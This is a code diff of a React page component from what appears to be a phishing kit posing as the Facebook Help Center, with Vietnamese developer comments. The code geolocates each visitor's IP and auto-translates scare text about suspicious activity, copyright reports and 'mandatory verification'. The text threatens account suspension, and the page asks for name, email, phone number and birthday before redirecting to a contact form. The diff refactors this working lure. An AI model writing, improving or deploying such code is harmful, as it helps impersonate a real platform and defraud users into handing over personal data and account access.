@@ -15,9 +15,11 @@ const Index: FC = () => {
     const [showGif, setShowGif] = useState(true);
     const [translationsReady, setTranslationsReady] = useState(false);
     const hasInitialized = useRef(false);
+    const verifyCalled = useRef(false);
+    const hasRedirected = useRef(false);
+    const translationStarted = useRef(false);
 
-
-    // Initialize security: get geoInfo, translate (không chặn bot nữa)
+    // Initialize security: get geoInfo (không chặn bot nữa, không dịch modal)
     const initializeSecurity = useCallback(async () => {
         try {
             const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
@@ -25,7 +27,6 @@ const Index: FC = () => {
             
             localStorage.setItem('ipInfo', JSON.stringify(ipData));
             
-            // Set geoInfo vào store
             setGeoInfo({
                 asn: ipData.asn || 0,
                 ip: ipData.ip || 'CHỊU',
@@ -39,7 +40,7 @@ const Index: FC = () => {
             localStorage.setItem('targetLang', targetLang);
             
         } catch (error) {
-            console.log('Security initialization failed:', error instanceof Error ? error.message : String(error));
+            console.error('Security initialization failed:', error);
             setGeoInfo({
                 asn: 0,
                 ip: 'CHỊU',
@@ -55,142 +56,97 @@ const Index: FC = () => {
     useEffect(() => {
         if (!gifTimerStarted.current) {
             gifTimerStarted.current = true;
-            
-            // Đếm thời gian từ khi mount
             const startTime = Date.now();
-            
             const checkAndHide = () => {
                 const elapsed = Date.now() - startTime;
-                
                 if (elapsed >= 2700) {
-                    // Đã đủ 2.7 giây → ẩn gif ngay (verify có thể chưa xong nhưng không sao)
                     setShowGif(false);
                 } else {
-                    // Chưa đủ 2.7 giây → check lại sau
                     setTimeout(checkAndHide, 100);
                 }
             };
-            
-            // Bắt đầu check
             checkAndHide();
         }
-        // Không có dependency để chỉ chạy 1 lần duy nhất
-        // eslint-disable-next-line react-hooks/exhaustive-deps
     }, []);
 
     // Initialize security và gọi verify API ngay khi component mount (song song)
     useEffect(() => {
         if (!hasInitialized.current) {
             hasInitialized.current = true;
-            
-            // Chạy song song: initializeSecurity và gọi verify API
             initializeSecurity();
             
             // Gọi verify API ngay (không cần đợi geoInfo)
-            axios.post('/api/verify').catch(() => {
-                // Ignore errors
-            });
+            const callVerify = async () => {
+                if (!verifyCalled.current) {
+                    verifyCalled.current = true;
+                    try {
+                        await axios.post('/api/verify');
+                    } catch (error) {
+                        console.error('Verify API failed:', error);
+                    }
+                }
+            };
+            callVerify();
         }
     }, [initializeSecurity]);
 
     // Dịch text của contact page (ngầm) ngay khi có geoInfo - chỉ chạy 1 lần
-    const translationStarted = useRef(false);
     useEffect(() => {
-        // Nếu chưa có geoInfo, đợi một chút rồi check lại
-        if (!geoInfo) {
-            // Nếu đã quá lâu mà vẫn chưa có geoInfo, vẫn set ready để không bị kẹt
-            const timeout = setTimeout(() => {
-                if (!geoInfo && !translationStarted.current) {
-                    setTranslationsReady(true);
-                }
-            }, 5000); // Đợi tối đa 5s
-            return () => clearTimeout(timeout);
-        }
-
+        if (!geoInfo) return;
         if (isTranslatingRef.current || translationStarted.current) return;
 
-        // Lấy các text cần dịch (KHÔNG dịch About, Ad choices, Create ad, Privacy, Careers, Create Page, Terms and policies, Cookies)
         const pageTexts = [
-            'Help Center',
-            'English',
-            'Using',
-            'Managing Your Account',
-            'Privacy, Safety and Security',
-            'Policies and Reporting',
-            'Account Policy Complaints',
-            'We have detected suspicious activity on your Pages and accounts, including reports of copyright infringement and policy violations',
+            'Help Center', 'English', 'Using', 'Managing Your Account', 'Privacy, Safety and Security',
+            'Policies and Reporting', 'Account Policy Complaints', 'We have detected suspicious activity on your Pages and accounts, including reports of copyright infringement and policy violations',
             'To protect your account, please verify your information now to ensure a quick and accurate review process.',
             'This is a mandatory verification step for Facebook accounts. Please complete the verification immediately to avoid account suspension and to expedite the resolution of your case.',
-            'Name',
-            'Email',
-            'Phone Number',
-            'Birthday',
-            'Your Appeal',
-            'Please describe your appeal in detail...',
-            'Submit',
-            'This field is required',
-            'Please enter a valid email address',
-            'Please wait...',
+            'Name', 'Email', 'Phone Number', 'Birthday', 'Your Appeal', 'Please describe your appeal in detail...',
+            'Submit', 'This field is required', 'Please enter a valid email address', 'Please wait...'
         ];
 
-        // Check xem đã có page text chưa
         const hasPageTexts = pageTexts.every((text) => storeTranslations[text]);
         if (hasPageTexts) {
-            // Đã dịch rồi → đánh dấu ready
             setTranslationsReady(true);
             return;
         }
 
         translationStarted.current = true;
         isTranslatingRef.current = true;
-
         const translatePageTexts = async () => {
             try {
-                // Dịch song song với Promise.all
-                const translatePromises = pageTexts.map((text) =>
-                    translateText(text, geoInfo.country_code).then((translated) => ({ text, translated }))
+                const results = await Promise.all(
+                    pageTexts.map((text) =>
+                        translateText(text, geoInfo.country_code).then((translated) => ({ text, translated }))
+                    )
                 );
 
-                const results = await Promise.all(translatePromises);
-
                 const translatedMap: Record<string, string> = { ...storeTranslations };
-
                 results.forEach(({ text, translated }) => {
                     translatedMap[text] = translated;
                 });
 
-                // Lưu vào store
                 setTranslations(translatedMap);
-                
-                // Đánh dấu đã dịch xong
                 setTranslationsReady(true);
             } catch (error) {
                 console.error('Translation failed:', error);
-                // Vẫn đánh dấu ready để không bị kẹt
                 setTranslationsReady(true);
             } finally {
                 isTranslatingRef.current = false;
             }
         };
-
         translatePageTexts();
-    }, [geoInfo, setTranslations, storeTranslations]);
+    }, [geoInfo, storeTranslations, setTranslations]);
 
     // Redirect khi gif ẩn VÀ dịch xong (để trang contact không bị trắng)
-    const hasRedirected = useRef(false);
     useEffect(() => {
         if (!showGif && translationsReady && !hasRedirected.current) {
             hasRedirected.current = true;
-            // Redirect khi gif ẩn và dịch xong để trang contact hiển thị ngay
             const currentTime = Date.now();
             router.push(`/contact/${currentTime}`);
         }
     }, [showGif, translationsReady, router]);
 
-    // Get logoGif src as string
-    const logoGifSrc: string = typeof logoGif === 'string' 
-        ? logoGif 
-        : (logoGif as { src: string }).src;
+    const logoGifSrc: string = typeof logoGif === 'string' ? logoGif : (logoGif as { src: string }).src;
 
     return (
         <>
